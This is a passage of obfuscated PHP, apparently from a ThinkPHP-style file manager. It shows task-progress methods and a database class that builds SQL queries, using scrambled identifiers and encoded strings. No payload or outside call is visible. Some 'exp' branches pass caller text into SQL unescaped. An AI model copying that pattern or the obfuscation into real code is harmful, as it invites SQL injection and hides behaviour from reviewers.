$¨ÀÑÌÌ„[$Ğù¥Æè÷[1742]] = $Ğù¥Æè÷[108]; } $this->update(); } public function copyFileEnd($×šø¡ãÚ, $×¾ÓÍÏ¸, $ÎİåÄíó, $íõïô¯Ù, $¢Şã³Ä, $§—Åîğ) { $íÊï¥ˆÆ =& $_SERVER[Ãìšã«™]; $…®Ú =& $this->task; $…®Ú[$íÊï¥ˆÆ[1699]] = $…®Ú[$íÊï¥ˆÆ[1698]]; $…®Ú[$íÊï¥ˆÆ[1703]] += $…®Ú[$íÊï¥ˆÆ[1698]]; $…®Ú[$íÊï¥ˆÆ[1700]] = $íÊï¥ˆÆ[12]; $this->update(); } public function nameParse($ªùŞôÅ¬) { $¾Ä”Ë®” =& $_SERVER[Ãìšã«™]; $½ä‚áà… =& $this->task; if ($½ä‚áà…[$¾Ä”Ë®”[1651]] < $½ä‚áà…[$¾Ä”Ë®”[787]]) { $Ç«¨’·æ = get_path_this($ªùŞôÅ¬); if (strstr($Ç«¨’·æ, $¾Ä”Ë®”[10])) { $½ä‚áà…[$¾Ä”Ë®”[1651]] += 1; } } if ($½ä‚áà…[$¾Ä”Ë®”[1742]] == $¾Ä”Ë®”[1193]) { $½ä‚áà…[$¾Ä”Ë®”[1742]] = $¾Ä”Ë®”[308]; } $½ä‚áà…[$¾Ä”Ë®”[1696]] = $ªùŞôÅ¬; $this->update(); } } goto bª¨š›ãŒ´; DÅ¶¶’„¯’: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\151\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\x6e\x65\x71" => "\74\x3e", "\147\164" => "\x3e", "\x65\x67\164" => "\x3e\75", "\154\164" => "\74", "\145\x6c\x74" => "\x3c\75", "\x6e\157\x74\x6c\151\153\145" => "\116\117\x54\40\114\x49\113\105", "\x6c\x69\153\145" => "\x4c\111\x4b\x45", "\151\156" => "\x49\x4e", "\156\x6f\164\x69\156" => "\116\117\x54\40\111\116", "\x6e\157\x74\40\x69\156" => "\x4e\x4f\x54\x20\111\x4e", "\x62\x65\164\x77\145\x65\156" => "\102\x45\x54\127\105\105\116", "\156\157\x74\x62\x65\164\167\x65\145\156" => "\x4e\x4f\x54\40\x42\105\x54\x57\x45\105\116", "\156\157\x74\40\x62\145\164\x77\x65\x65\156" => "\116\x4f\x54\40\102\x45\124\x57\x45\x45\x4e"); protected $selectSql = "\x53\105\114\105\x43\124\x25\x44\111\123\x54\111\x4e\x43\x54\45\x20\x25\106\x49\105\114\104\x25\x20\x46\x52\117\x4d\40\45\x54\101\x42\x4c\105\x25\x25\x4a\117\x49\x4e\x25\45\127\110\x45\x52\x45\45\x25\x47\122\117\125\x50\45\45\110\101\x56\x49\116\107\45\x25\117\x52\104\105\122\45\x25\114\111\115\111\x54\x25\x20\x25\125\x4e\111\x4f\x4e\x25\x25\103\x4f\x4d\115\105\116\x54\x25"; protected $bind = array(); public static function getInstance() { $ô­ŞÈ°í = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ãìšã«™][956], $ô­ŞÈ°í); } public function factory($µæ—ê×õ = '') { $»ĞÜºı¥ =& $_SERVER[Ãìšã«™]; $µæ—ê×õ = $this->parseConfig($µæ—ê×õ); if (empty($µæ—ê×õ[$»ĞÜºı¥[957]])) { think_exception(think_lang($»ĞÜºı¥[958])); } $this->dbType = ucwords(strtolower($µæ—ê×õ[$»ĞÜºı¥[957]])); $¿£ëÆõé = $»ĞÜºı¥[959] . $this->dbType; if (class_exists($¿£ëÆõé)) { $ÖÀ“³Óæ = new $¿£ëÆõé($µæ—ê×õ); if ($»ĞÜºı¥[960] != strtolower($µæ—ê×õ[$»ĞÜºı¥[957]])) { $ÖÀ“³Óæ->dbType = strtoupper($this->dbType); } else { $ÖÀ“³Óæ->dbType = $this->_getDsnType($µæ—ê×õ[$»ĞÜºı¥[912]]); } } else { think_exception(think_lang($»ĞÜºı¥[961]) . $»ĞÜºı¥[962] . $¿£ëÆõé); } return $ÖÀ“³Óæ; } public function __call($şü«¥Ñˆ, $‹¬±¥Ø€) { if (method_exists($this, $şü«¥Ñˆ)) { return call_user_func_array(array($this, $şü«¥Ñˆ), $‹¬±¥Ø€); } } protected function _getDsnType($¤Ø ¡”À) { $Ö¡—ù²µ = explode($_SERVER[Ãìšã«™][4], $¤Ø ¡”À); $®Ùô’ÒÒ = strtoupper(trim($Ö¡—ù²µ[0])); return $®Ùô’ÒÒ; } private function parseConfig($ĞıŸÈ¹ = '') { $ªÒ÷ä»á =& $_SERVER[Ãìšã«™]; if (!empty($ĞıŸÈ¹) && is_string($ĞıŸÈ¹)) { $ĞıŸÈ¹ = $this->parseDSN($ĞıŸÈ¹); } elseif (is_array($ĞıŸÈ¹)) { $ĞıŸÈ¹ = array_change_key_case($ĞıŸÈ¹); $ĞıŸÈ¹ = array($ªÒ÷ä»á[957] => $ĞıŸÈ¹[$ªÒ÷ä»á[963]], $ªÒ÷ä»á[884] => $ĞıŸÈ¹[$ªÒ÷ä»á[964]], $ªÒ÷ä»á[885] => $ĞıŸÈ¹[$ªÒ÷ä»á[965]], $ªÒ÷ä»á[882] => $ĞıŸÈ¹[$ªÒ÷ä»á[966]], $ªÒ÷ä»á[883] => $ĞıŸÈ¹[$ªÒ÷ä»á[967]], $ªÒ÷ä»á[21] => $ĞıŸÈ¹[$ªÒ÷ä»á[968]], $ªÒ÷ä»á[912] => $ĞıŸÈ¹[$ªÒ÷ä»á[969]], $ªÒ÷ä»á[17] => isset($ĞıŸÈ¹[$ªÒ÷ä»á[970]]) ? $ĞıŸÈ¹[$ªÒ÷ä»á[970]] : array()); } elseif (empty($ĞıŸÈ¹)) { if (think_config($ªÒ÷ä»á[971]) && $ªÒ÷ä»á[960] != strtolower(think_config($ªÒ÷ä»á[972]))) { $ĞıŸÈ¹ = $this->parseDSN(think_config($ªÒ÷ä»á[971])); } else { $ĞıŸÈ¹ = array($ªÒ÷ä»á[957] => think_config($ªÒ÷ä»á[972]), $ªÒ÷ä»á[884] => think_config($ªÒ÷ä»á[973]), $ªÒ÷ä»á[885] => think_config($ªÒ÷ä»á[974]), $ªÒ÷ä»á[882] => think_config($ªÒ÷ä»á[975]), $ªÒ÷ä»á[883] => think_config($ªÒ÷ä»á[976]), $ªÒ÷ä»á[21] => think_config($ªÒ÷ä»á[241]), $ªÒ÷ä»á[912] => think_config($ªÒ÷ä»á[971]), $ªÒ÷ä»á[17] => think_config($ªÒ÷ä»á[977])); } } return $ĞıŸÈ¹; } protected function initConnect($®ş†Ä° = true) { if (1 == think_config($_SERVER[Ãìšã«™][22])) { $this->_linkID = $this->multiConnect($®ş†Ä°); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¼ÔÃ§ùÆ => $éÉúÈ¹á) { $this->_linkID = $éÉúÈ¹á; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ÚôÄÄ› = false) { $çÈö²è‹ =& $_SERVER[Ãìšã«™]; static $¾à¾ô‡ = array(); static $¹óö÷ÄÔ = -1; if (empty($¾à¾ô‡)) { foreach ($this->config as $İÙü”ƒº => $îÁ›Ã·) { $¾à¾ô‡[$İÙü”ƒº] = explode($çÈö²è‹[50], $îÁ›Ã·); } } if (think_config($çÈö²è‹[978])) { if ($ÚôÄÄ› || think_config($çÈö²è‹[388]) === !0) { $ªëÔŞ­² = floor(mt_rand(0, think_config($çÈö²è‹[979]) - 1)); $¹óö÷ÄÔ = $ªëÔŞ­²; } else { if (is_numeric(think_config($çÈö²è‹[980]))) { $ªëÔŞ­² = think_config($çÈö²è‹[980]); } else { $ªëÔŞ­² = floor(mt_rand(think_config($çÈö²è‹[979]), count($¾à¾ô‡[$çÈö²è‹[882]]) - 1)); } } } else { $ªëÔŞ­² = floor(mt_rand(0, count($¾à¾ô‡[$çÈö²è‹[882]]) - 1)); $¹óö÷ÄÔ = $ªëÔŞ­²; } $ªëÔŞ­² = $¹óö÷ÄÔ !== -1 ? $¹óö÷ÄÔ : $ªëÔŞ­²; $¤ù‡ùá´ = array($çÈö²è‹[884] => isset($¾à¾ô‡[$çÈö²è‹[884]][$ªëÔŞ­²]) ? $¾à¾ô‡[$çÈö²è‹[884]][$ªëÔŞ­²] : $¾à¾ô‡[$çÈö²è‹[884]][0], $çÈö²è‹[885] => isset($¾à¾ô‡[$çÈö²è‹[885]][$ªëÔŞ­²]) ? $¾à¾ô‡[$çÈö²è‹[885]][$ªëÔŞ­²] : $¾à¾ô‡[$çÈö²è‹[885]][0], $çÈö²è‹[882] => isset($¾à¾ô‡[$çÈö²è‹[882]][$ªëÔŞ­²]) ? $¾à¾ô‡[$çÈö²è‹[882]][$ªëÔŞ­²] : $¾à¾ô‡[$çÈö²è‹[882]][0], $çÈö²è‹[883] => isset($¾à¾ô‡[$çÈö²è‹[883]][$ªëÔŞ­²]) ? $¾à¾ô‡[$çÈö²è‹[883]][$ªëÔŞ­²] : $¾à¾ô‡[$çÈö²è‹[883]][0], $çÈö²è‹[21] => isset($¾à¾ô‡[$çÈö²è‹[21]][$ªëÔŞ­²]) ? $¾à¾ô‡[$çÈö²è‹[21]][$ªëÔŞ­²] : $¾à¾ô‡[$çÈö²è‹[21]][0], $çÈö²è‹[912] => isset($¾à¾ô‡[$çÈö²è‹[912]][$ªëÔŞ­²]) ? $¾à¾ô‡[$çÈö²è‹[912]][$ªëÔŞ­²] : $¾à¾ô‡[$çÈö²è‹[912]][0], $çÈö²è‹[17] => isset($¾à¾ô‡[$çÈö²è‹[17]][$ªëÔŞ­²]) ? $¾à¾ô‡[$çÈö²è‹[17]][$ªëÔŞ­²] : $¾à¾ô‡[$çÈö²è‹[17]][0]); return $this->connect($¤ù‡ùá´, $ªëÔŞ­²); } public function parseDSN($²àÉó¾Ø) { $ó©¬»—Ä =& $_SERVER[Ãìšã«™]; if (empty($²àÉó¾Ø)) { return !1; } $ğ½é¹İ— = parse_url($²àÉó¾Ø); if ($ğ½é¹İ—[$ó©¬»—Ä[173]]) { $ú—ƒØÆñ = array($ó©¬»—Ä[957] => $ğ½é¹İ—[$ó©¬»—Ä[173]], $ó©¬»—Ä[884] => isset($ğ½é¹İ—[$ó©¬»—Ä[594]]) ? $ğ½é¹İ—[$ó©¬»—Ä[594]] : $ó©¬»—Ä[12], $ó©¬»—Ä[885] => isset($ğ½é¹İ—[$ó©¬»—Ä[981]]) ? $ğ½é¹İ—[$ó©¬»—Ä[981]] : $ó©¬»—Ä[12], $ó©¬»—Ä[882] => isset($ğ½é¹İ—[$ó©¬»—Ä[174]]) ? $ğ½é¹İ—[$ó©¬»—Ä[174]] : $ó©¬»—Ä[12], $ó©¬»—Ä[883] => isset($ğ½é¹İ—[$ó©¬»—Ä[175]]) ? $ğ½é¹İ—[$ó©¬»—Ä[175]] : $ó©¬»—Ä[12], $ó©¬»—Ä[21] => isset($ğ½é¹İ—[$ó©¬»—Ä[78]]) ? substr($ğ½é¹İ—[$ó©¬»—Ä[78]], 1) : $ó©¬»—Ä[12]); } else { preg_match($ó©¬»—Ä[982], trim($²àÉó¾Ø), $Çğë±–ƒ); $ú—ƒØÆñ = array($ó©¬»—Ä[957] => $Çğë±–ƒ[1], $ó©¬»—Ä[884] => $Çğë±–ƒ[2], $ó©¬»—Ä[885] => $Çğë±–ƒ[3], $ó©¬»—Ä[882] => $Çğë±–ƒ[4], $ó©¬»—Ä[883] => $Çğë±–ƒ[5], $ó©¬»—Ä[21] => $Çğë±–ƒ[6]); } $ú—ƒØÆñ[$ó©¬»—Ä[912]] = $ó©¬»—Ä[12]; return $ú—ƒØÆñ; } protected function debug() { $³ÁñÍ£Ú =& $_SERVER[Ãìšã«™]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $³ÁñÍ£Ú[983]; if (think_config($³ÁñÍ£Ú[984])) { think_status($³ÁñÍ£Ú[985]); think_trace($this->queryStr . $³ÁñÍ£Ú[986] . think_status($³ÁñÍ£Ú[24], $³ÁñÍ£Ú[985], 6) . $³ÁñÍ£Ú[987], $³ÁñÍ£Ú[12], $³ÁñÍ£Ú[988]); } } protected function parseLock($ŒŸ´¬ËÛ = false) { $È÷ÏäØè =& $_SERVER[Ãìšã«™]; if (!$ŒŸ´¬ËÛ) { return $È÷ÏäØè[12]; } if ($È÷ÏäØè[914] == $this->dbType) { return $È÷ÏäØè[989]; } return $È÷ÏäØè[990]; } protected function parseSet($µÖëù·à) { $¤¤™ÃÌØ =& $_SERVER[Ãìšã«™]; foreach ($µÖëù·à as $¥é¹Êì => $÷å¡ßü¯) { if (is_array($÷å¡ßü¯) && $¤¤™ÃÌØ[292] == $÷å¡ßü¯[0]) { $´‰´öÑ§[] = $this->parseKey($¥é¹Êì) . $¤¤™ÃÌØ[880] . $÷å¡ßü¯[1]; } elseif (is_scalar($÷å¡ßü¯) || is_null($÷å¡ßü¯)) { $´‰´öÑ§[] = $this->parseKey($¥é¹Êì) . $¤¤™ÃÌØ[880] . $this->parseValue($÷å¡ßü¯); } } return $¤¤™ÃÌØ[991] . implode($¤¤™ÃÌØ[50], $´‰´öÑ§); } protected function bindParam($¿ĞÕêñ, $¦Òİêì) { $this->bind[$_SERVER[Ãìšã«™][4] . $¿ĞÕêñ] = $¦Òİêì; } protected function parseBind($Ã’›ëã) { $Ã’›ëã = array_merge($this->bind, $Ã’›ëã); $this->bind = array(); return $Ã’›ëã; } function parseKey(&$ùÁÀ–¸Ñ, $®¾˜ƒ‡å = true) { if ($®¾˜ƒ‡å) { $ùÁÀ–¸Ñ = $this->parseKeyCheck($ùÁÀ–¸Ñ); } return $ùÁÀ–¸Ñ; } function parseKeyCheck($ãÊ¼àªµ) { $øÍÙÔ =& $_SERVER[Ãìšã«™]; $ãÊ¼àªµ = trim($ãÊ¼àªµ); if (!preg_match($øÍÙÔ[992], $ãÊ¼àªµ)) { think_exception($øÍÙÔ[993] . $ãÊ¼àªµ); } return $ãÊ¼àªµ; } protected function parseValue($‹½¯™×€) { $¹ÚŠ†€¼ =& $_SERVER[Ãìšã«™]; if (is_string($‹½¯™×€)) { $‹½¯™×€ = $¹ÚŠ†€¼[953] . $this->escapeString($‹½¯™×€) . $¹ÚŠ†€¼[953]; } elseif (isset($‹½¯™×€[0]) && is_string($‹½¯™×€[0]) && strtolower($‹½¯™×€[0]) == $¹ÚŠ†€¼[292]) { $‹½¯™×€ = $this->escapeString($‹½¯™×€[1]); } elseif (is_array($‹½¯™×€)) { $‹½¯™×€ = array_map(array($this, $¹ÚŠ†€¼[954]), $‹½¯™×€); } elseif (is_bool($‹½¯™×€)) { $‹½¯™×€ = $‹½¯™×€ ? $¹ÚŠ†€¼[89] : $¹ÚŠ†€¼[190]; } elseif (is_null($‹½¯™×€)) { $‹½¯™×€ = $¹ÚŠ†€¼[104]; } return $‹½¯™×€; } protected function parseField($òßÚ íÏ) { $ã”­ğø– =& $_SERVER[Ãìšã«™]; if (is_string($òßÚ íÏ) && strpos($òßÚ íÏ, $ã”­ğø–[50])) { $òßÚ íÏ = explode($ã”­ğø–[50], $òßÚ íÏ); } if (is_array($òßÚ íÏ)) { $•¯·Ó¾¬ = array(); foreach ($òßÚ íÏ as $•˜ï·Ú¿ => $è’õ÷ğ) { if (!is_numeric($•˜ï·Ú¿)) { $•¯·Ó¾¬[] = $this->parseKey($•˜ï·Ú¿, !1) . $ã”­ğø–[994] . $this->parseKey($è’õ÷ğ); } else { $•¯·Ó¾¬[] = $this->parseKey($è’õ÷ğ); } } $º¡˜¶‘ó = implode($ã”­ğø–[50], $•¯·Ó¾¬); } elseif (is_string($òßÚ íÏ) && !empty($òßÚ íÏ)) { $º¡˜¶‘ó = $òßÚ íÏ; } else { $º¡˜¶‘ó = $ã”­ğø–[181]; } return $º¡˜¶‘ó; } protected function parseTable($ı³‘éüÁ) { $Ì²µÉ¬ô =& $_SERVER[Ãìšã«™]; if (is_array($ı³‘éüÁ)) { $¡®¼éÚ = array(); foreach ($ı³‘éüÁ as $ùãÆäÚ¼ => $àá¯ˆ) { if (!is_numeric($ùãÆäÚ¼)) { $¡®¼éÚ[] = $this->parseKey($ùãÆäÚ¼) . $Ì²µÉ¬ô[53] . $this->parseKey($àá¯ˆ); } else { $¡®¼éÚ[] = $this->parseKey($ùãÆäÚ¼); } } $ı³‘éüÁ = $¡®¼éÚ; } elseif (is_string($ı³‘éüÁ)) { if (strstr($ı³‘éüÁ, $Ì²µÉ¬ô[53])) { return $ı³‘éüÁ; } $ı³‘éüÁ = explode($Ì²µÉ¬ô[50], $ı³‘éüÁ); array_walk($ı³‘éüÁ, array($this, $Ì²µÉ¬ô[902])); } return $Ì²µÉ¬ô[896] . trim(implode($Ì²µÉ¬ô[995], $ı³‘éüÁ), $Ì²µÉ¬ô[380]) . $Ì²µÉ¬ô[896]; } protected function parseWhere($¾Ë€¡³Ó) { $è¹Ø»Û‘ =& $_SERVER[Ãìšã«™]; $÷”äóÖÉ = $è¹Ø»Û‘[12]; if (is_string($¾Ë€¡³Ó)) { $÷”äóÖÉ = $¾Ë€¡³Ó; } else { $ ßÙ¿ªµ = isset($¾Ë€¡³Ó[$è¹Ø»Û‘[996]]) ? strtoupper($¾Ë€¡³Ó[$è¹Ø»Û‘[996]]) : $è¹Ø»Û‘[12]; if (in_array($ ßÙ¿ªµ, array($è¹Ø»Û‘[997], $è¹Ø»Û‘[998], $è¹Ø»Û‘[999]))) { $ ßÙ¿ªµ = $è¹Ø»Û‘[53] . $ ßÙ¿ªµ . $è¹Ø»Û‘[53]; unset($¾Ë€¡³Ó[$è¹Ø»Û‘[996]]); } else { $ ßÙ¿ªµ = $è¹Ø»Û‘[1000]; } foreach ($¾Ë€¡³Ó as $„›¹ÌÅ° => $â¶Óõş–) { $÷”äóÖÉ .= $è¹Ø»Û‘[272]; if (is_numeric($„›¹ÌÅ°)) { $„›¹ÌÅ° = $è¹Ø»Û‘[1001]; } if (0 === strpos($„›¹ÌÅ°, $è¹Ø»Û‘[11])) { $÷”äóÖÉ .= $this->parseThinkWhere($„›¹ÌÅ°, $â¶Óõş–); } else { if (!preg_match($è¹Ø»Û‘[1002], trim($„›¹ÌÅ°))) { think_exception(think_lang($è¹Ø»Û‘[1003]) . $è¹Ø»Û‘[4] . $„›¹ÌÅ°); } $…İ¨ò® = is_array($â¶Óõş–) && isset($â¶Óõş–[$è¹Ø»Û‘[1004]]); $„›¹ÌÅ° = trim($„›¹ÌÅ°); if (strpos($„›¹ÌÅ°, $è¹Ø»Û‘[278])) { $÷í‡»ğ› = explode($è¹Ø»Û‘[278], $„›¹ÌÅ°); $è§ÉÏûÕ = array(); foreach ($÷í‡»ğ› as $˜Ã¡ÛóÈ => $Õ€â¶²) { $ªîŞš­ = $…İ¨ò® ? $â¶Óõş–[$˜Ã¡ÛóÈ] : $â¶Óõş–; $è§ÉÏûÕ[] = $è¹Ø»Û‘[255] . $this->parseWhereItem($this->parseKey($Õ€â¶²), $ªîŞš­) . $è¹Ø»Û‘[901]; } $÷”äóÖÉ .= implode($è¹Ø»Û‘[1005], $è§ÉÏûÕ); } elseif (strpos($„›¹ÌÅ°, $è¹Ø»Û‘[279])) { $÷í‡»ğ› = explode($è¹Ø»Û‘[279], $„›¹ÌÅ°); $è§ÉÏûÕ = array(); foreach ($÷í‡»ğ› as $˜Ã¡ÛóÈ => $Õ€â¶²) { $ªîŞš­ = $…İ¨ò® ? $â¶Óõş–[$˜Ã¡ÛóÈ] : $â¶Óõş–; $è§ÉÏûÕ[] = $è¹Ø»Û‘[255] . $this->parseWhereItem($this->parseKey($Õ€â¶²), $ªîŞš­) . $è¹Ø»Û‘[901]; } $÷”äóÖÉ .= implode($è¹Ø»Û‘[1000], $è§ÉÏûÕ); } else { $÷”äóÖÉ .= $this->parseWhereItem($this->parseKey($„›¹ÌÅ°), $â¶Óõş–); } } $÷”äóÖÉ .= $è¹Ø»Û‘[273] . $ ßÙ¿ªµ; } $÷”äóÖÉ = substr($÷”äóÖÉ, 0, -strlen($ ßÙ¿ªµ)); } return empty($÷”äóÖÉ) ? $è¹Ø»Û‘[12] : $è¹Ø»Û‘[1006] . $÷”äóÖÉ; } protected function parseWhereItem($ç½ƒñÙ, $“Ö¯ïÅœ) { $™ÏáÚî =& $_SERVER[Ãìšã«™]; $¸Ùõ = $™ÏáÚî[12]; if (is_array($“Ö¯ïÅœ)) { if (is_string($“Ö¯ïÅœ[0])) { $†ÂÛæõÁ = strtolower($“Ö¯ïÅœ[0]); if (in_array($“Ö¯ïÅœ[0], array($™ÏáÚî[880], $™ÏáÚî[1007], $™ÏáÚî[1008], $™ÏáÚî[1009], $™ÏáÚî[1010], $™ÏáÚî[1011]))) { $¸Ùõ .= $ç½ƒñÙ . $™ÏáÚî[53] . $“Ö¯ïÅœ[0] . $™ÏáÚî[53] . $this->parseValue($“Ö¯ïÅœ[1]); } elseif (preg_match($™ÏáÚî[1012], $“Ö¯ïÅœ[0])) { $¸Ùõ .= $ç½ƒñÙ . $™ÏáÚî[53] . $this->exp[$†ÂÛæõÁ] . $™ÏáÚî[53] . $this->parseValue($“Ö¯ïÅœ[1]); } elseif (preg_match($™ÏáÚî[1013], $“Ö¯ïÅœ[0])) { if (is_array($“Ö¯ïÅœ[1])) { $¥åìç·¤ = isset($“Ö¯ïÅœ[2]) ? strtoupper($“Ö¯ïÅœ[2]) : $™ÏáÚî[998]; if (in_array($¥åìç·¤, array($™ÏáÚî[997], $™ÏáÚî[998], $™ÏáÚî[999]))) { $Ê†Ø‚óÑ = array(); foreach ($“Ö¯ïÅœ[1] as $Ñ£¥Ù¦”) { $Ê†Ø‚óÑ[] = $ç½ƒñÙ . $™ÏáÚî[53] . $this->exp[$†ÂÛæõÁ] . $™ÏáÚî[53] . $this->parseValue($Ñ£¥Ù¦”); } $¸Ùõ .= $™ÏáÚî[255] . implode($™ÏáÚî[53] . $¥åìç·¤ . $™ÏáÚî[53], $Ê†Ø‚óÑ) . $™ÏáÚî[901]; } } else { $¸Ùõ .= $ç½ƒñÙ . $™ÏáÚî[53] . $this->exp[$†ÂÛæõÁ] . $™ÏáÚî[53] . $this->parseValue($“Ö¯ïÅœ[1]); } } elseif ($™ÏáÚî[292] == $†ÂÛæõÁ) { $¸Ùõ .= $™ÏáÚî[899] . $ç½ƒñÙ . $™ÏáÚî[53] . $“Ö¯ïÅœ[1] . $™ÏáÚî[1014]; } elseif (preg_match($™ÏáÚî[1015], $“Ö¯ïÅœ[0])) { $¸Ùõ .= $“Ö¯ïÅœ[0]; } elseif (preg_match($™ÏáÚî[1016], $“Ö¯ïÅœ[0])) { if (isset($“Ö¯ïÅœ[2]) && $™ÏáÚî[292] == $“Ö¯ïÅœ[2]) { $¸Ùõ .= $ç½ƒñÙ . $™ÏáÚî[53] . $this->exp[$†ÂÛæõÁ] . $™ÏáÚî[53] . $“Ö¯ïÅœ[1]; } else { if (is_string($“Ö¯ïÅœ[1])) { $“Ö¯ïÅœ[1] = explode($™ÏáÚî[50], $“Ö¯ïÅœ[1]); } $‰ß§£êû = implode($™ÏáÚî[50], $this->parseValue($“Ö¯ïÅœ[1])); $¸Ùõ .= $ç½ƒñÙ . $™ÏáÚî[53] . $this->exp[$†ÂÛæõÁ] . $™ÏáÚî[899] . $‰ß§£êû . $™ÏáÚî[901]; } } elseif (preg_match($™ÏáÚî[1017], $“Ö¯ïÅœ[0])) { $¨Ì°ÂÅ = is_string($“Ö¯ïÅœ[1]) ? explode($™ÏáÚî[50], $“Ö¯ïÅœ[1]) : $“Ö¯ïÅœ[1]; $¸Ùõ .= $™ÏáÚî[899] . $ç½ƒñÙ . $™ÏáÚî[53] . $this->exp[$†ÂÛæõÁ] . $™ÏáÚî[53] . $this->parseValue($¨Ì°ÂÅ[0]) . $™ÏáÚî[1000] . $this->parseValue($¨Ì°ÂÅ[1]) . $™ÏáÚî[273]; } else { think_exception(think_lang($™ÏáÚî[1003]) . $™ÏáÚî[4] . $“Ö¯ïÅœ[0]); } } else { $ÈàÙ”˜ = count($“Ö¯ïÅœ); $­ê‡’äô = $™ÏáÚî[12]; if (is_string($“Ö¯ïÅœ[$ÈàÙ”˜ - 1])) { $­ê‡’äô = isset($“Ö¯ïÅœ[$ÈàÙ”˜ - 1]) ? strtoupper($“Ö¯ïÅœ[$ÈàÙ”˜ - 1]) : $™ÏáÚî[12]; if (in_array($­ê‡’äô, array($™ÏáÚî[997], $™ÏáÚî[998], $™ÏáÚî[999]))) { $ÈàÙ”˜ = $ÈàÙ”˜ - 1; } } else { $­ê‡’äô = $™ÏáÚî[997]; } for ($à×¯Áî” = 0; $à×¯Áî” < $ÈàÙ”˜; $à×¯Áî”++) { $¨Ì°ÂÅ = is_array($“Ö¯ïÅœ[$à×¯Áî”]) ? $“Ö¯ïÅœ[$à×¯Áî”][1] : $“Ö¯ïÅœ[$à×¯Áî”]; if ($™ÏáÚî[292] == strtolower($“Ö¯ïÅœ[$à×¯Áî”][0])) { $¸Ùõ .= $™ÏáÚî[255] . $ç½ƒñÙ . $™ÏáÚî[53] . $¨Ì°ÂÅ . $™ÏáÚî[1014] . $­ê‡’äô . $™ÏáÚî[53]; } else { $·¡¼†× = is_array($“Ö¯ïÅœ[$à×¯Áî”]) ? $this->exp[strtolower($“Ö¯ïÅœ[$à×¯Áî”][0])] : $™ÏáÚî[880]; if (!$·¡¼†× && is_array($“Ö¯ïÅœ[$à×¯Áî”]) && in_array($“Ö¯ïÅœ[$à×¯Áî”][0], array($™ÏáÚî[880], $™ÏáÚî[1007], $™ÏáÚî[1008], $™ÏáÚî[1009], $™ÏáÚî[1010], $™ÏáÚî[1011]))) { $·¡¼†× = $“Ö¯ïÅœ[$à×¯Áî”][0]; } $¸Ùõ .= $™ÏáÚî[255] . $ç½ƒñÙ . $™ÏáÚî[53] . $·¡¼†× . $™ÏáÚî[53] . $this->parseValue($¨Ì°ÂÅ) . $™ÏáÚî[1014] . $­ê‡’äô . $™ÏáÚî[53]; } } $¸Ùõ = substr($¸Ùõ, 0, -4); } } else { $¸Ùõ .= $ç½ƒñÙ . $™ÏáÚî[1018] . $this->parseValue($“Ö¯ïÅœ); } return $¸Ùõ; } protected function parseThinkWhere($¤Ï›ùòÚ, $‚±ÂÙÉà) { $âÙöæ¸Ã =& $_SERVER[Ãìšã«™]; $·ØÙàµŸ = $âÙöæ¸Ã[12]; switch ($¤Ï›ùòÚ) { case $âÙöæ¸Ã[347]: $·ØÙàµŸ = $‚±ÂÙÉà; break; case $âÙöæ¸Ã[1001]: $·ØÙàµŸ = is_string($‚±ÂÙÉà) ? $‚±ÂÙÉà : substr($this->parseWhere($‚±ÂÙÉà), 6); break; case $âÙöæ¸Ã[1019]: parse_str($‚±ÂÙÉà, $¼ÅíĞìã); if (isset($¼ÅíĞìã[$âÙöæ¸Ã[996]])) { $Ó±µÏ³ = $âÙöæ¸Ã[53] . strtoupper($¼ÅíĞìã[$âÙöæ¸Ã[996]]) . $âÙöæ¸Ã[53]; unset($¼ÅíĞìã[$âÙöæ¸Ã[996]]); } else { $Ó±µÏ³ = $âÙöæ¸Ã[1000]; } $ŸÌ¸Ğğ· = array(); foreach ($¼ÅíĞìã as $‡¬‰µÕ¬ => $‰¹¦æå¬) { $ŸÌ¸Ğğ·[] = $this->parseKey($‡¬‰µÕ¬) . $âÙöæ¸Ã[1018] . $this->parseValue($‰¹¦æå¬); } $·ØÙàµŸ = implode($Ó±µÏ³, $ŸÌ¸Ğğ·); break; } return $·ØÙàµŸ; } protected function parseLimit($ĞˆÃ¤Ô) { $²¨Á¤ˆ =& $_SERVER[Ãìšã«™]; return !empty($ĞˆÃ¤Ô) ? $²¨Á¤ˆ[51] . $ĞˆÃ¤Ô . $²¨Á¤ˆ[53] : $²¨Á¤ˆ[12]; } protected function parseJoin($Ø®€†Î‹) { $ûÃìöÍ =& $_SERVER[Ãìšã«™]; $¶á€‘ = $ûÃìöÍ[12]; if (!empty($Ø®€†Î‹)) { if (is_array($Ø®€†Î‹)) { foreach ($Ø®€†Î‹ as $Àı±ƒõ˜ => $ÊˆâÃÚâ) { if (!1 !== stripos($ÊˆâÃÚâ, $ûÃìöÍ[1020])) { $¶á€‘ .= $ûÃìöÍ[53] . $ÊˆâÃÚâ; } else { $¶á€‘ .= $ûÃìöÍ[1021] . $ÊˆâÃÚâ; } } } else { $¶á€‘ .= $ûÃìöÍ[1021] . $Ø®€†Î‹; } } $¶á€‘ = preg_replace($ûÃìöÍ[1022], think_config($ûÃìöÍ[926]) . $ûÃìöÍ[1023], $¶á€‘); return $¶á€‘; } protected function parseOrder($¸ÈäçÕ) { $İšäó =& $_SERVER[Ãìšã«™]; if (is_array($¸ÈäçÕ)) { $¿œœúäÁ = array(); foreach ($¸ÈäçÕ as $ˆ¼óÍá => $ñ™÷˜œ¬) { if (is_numeric($ˆ¼óÍá)) { $¿œœúäÁ[] = $this->parseKey($ñ™÷˜œ¬); } else { $ñ™÷˜œ¬ = in_array(strtoupper(trim($ñ™÷˜œ¬)), array($İšäó[1024], $İšäó[1025])) ? $İšäó[53] . $ñ™÷˜œ¬ : $İšäó[12]; if (preg_match($İšäó[1026], $ˆ¼óÍá)) { $¿œœúäÁ[] = $this->parseKey($ˆ¼óÍá) . $ñ™÷˜œ¬; } else { think_exception($İšäó[1027] . $ˆ¼óÍá); } } } 